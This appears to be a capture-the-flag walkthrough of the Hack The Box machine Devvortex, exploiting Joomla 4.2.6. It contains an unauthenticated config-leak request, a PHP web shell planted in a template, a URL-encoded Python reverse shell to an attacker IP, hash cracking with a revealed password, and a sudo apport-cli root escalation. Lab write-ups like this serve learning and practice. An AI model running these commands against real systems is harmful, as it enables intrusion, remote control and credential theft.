## Port Scan

The port scan shows only the usual port 80 and 22 so a web service and ssh service.
We are running a web site then and we will enumerate it.

## Directory and Vhosts enumeration

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u devvortex.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

There is nothing relevant. 
Another thing to test are virtual hosts, using the huge combined_subdomains wordlist from seclists.

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u 10.10.11.242 --append-domain  --domain devvortex.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.10.11.242
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```

So there is an hidden virtual host using the subdomain `dev` and we are going to continue from that one.

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://dev.devvortex.htb/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
```

Many directories! Let's start exploring them, the website is based on `Joomla`.

## Exploit Known Vulnerability 

The Joomla version is visible via `joomscan`, the tool available in Kali.

```shell
joomscan --url http://dev.devvortex.htb
```

The version is 4.2.6 but no other relevant information is retrieved.

There is a common vulnerability in this version of Joomla, though: https://vulncheck.com/blog/joomla-for-rce. By invoking the following the database credentials will be visible:

```shell
curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
```

This allows us to retrieve a valid database username and a valid password.
Luckily these are working well with the admin panel as well!

## Admin Panel

Once in the admin panel, it is possible to see and modify certain pages. One example is the file `/templates/cassiopeia/cassiopeia/error.php`, editable from the Joomla template editing menu. This is enough to create a web shell, injecting this code in the PHP page, for instance at the very beginning of the page.

```php
system($_GET['cmd']);
```

then use the following command to inject the shell by passing shell commands via the `cmd` parameter. After trying multiple shells, this python reverse shell works, but it must be URL-encoded.

```shell
curl http://dev.devvortex.htb/templates/cassiopeia/cassiopeia/error.php?cmd=export%20RHOST%3D%2210.10.14.47%22%3Bexport%20RPORT%3D24387%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
```

## Crack Password

Once in, the user is `www-data` but there is no flag in its home directory. There is another user in the machine, `logan` that happened to be visible in the admin panel as well. Maybe the password for the Joomla user in the database will be the same of the Linux user?

Notice that it is possible to access the `mysql` database on the machine. This can be accessed with the same credentials used for the admin panel. Answer with the password for the user `lewis`.

```shell
mysql -u lewis -p
```

Let's get the password hashes from the users table.

```sql
SHOW TABLE;
```

This will give us all the tables. Let's identify the user table whose name will be prefixed but clearly identifiable.

```sql
SELECT * FROM prefix_users;
```

And from the results, let's get the the hash of the user `logan`. This is a Blowfish hash. Let's crack it via Hashcat.

```shell
hashcat -m3200 <hash_file> /usr/share/wordlists/rockyou.tar.gz
```

The password is `tequieromucho` so we can use that to login via ssh as the user `logan` now
and this user has the `user.txt` file inside his home directory.

## Privilege Escalation

This is trivial. Run `sudo -l` and notice that `apport-cli` can be executed with root privileges.

Running:

```shell
sudo apport-cli -f
```

we can file a crash report. The report editors run in a Linux pager. As usual this can be used to inject commands via the pager shell via `:!sh` that will open a root shell.

The `root.txt` is in the `/root` directory that is now visible.
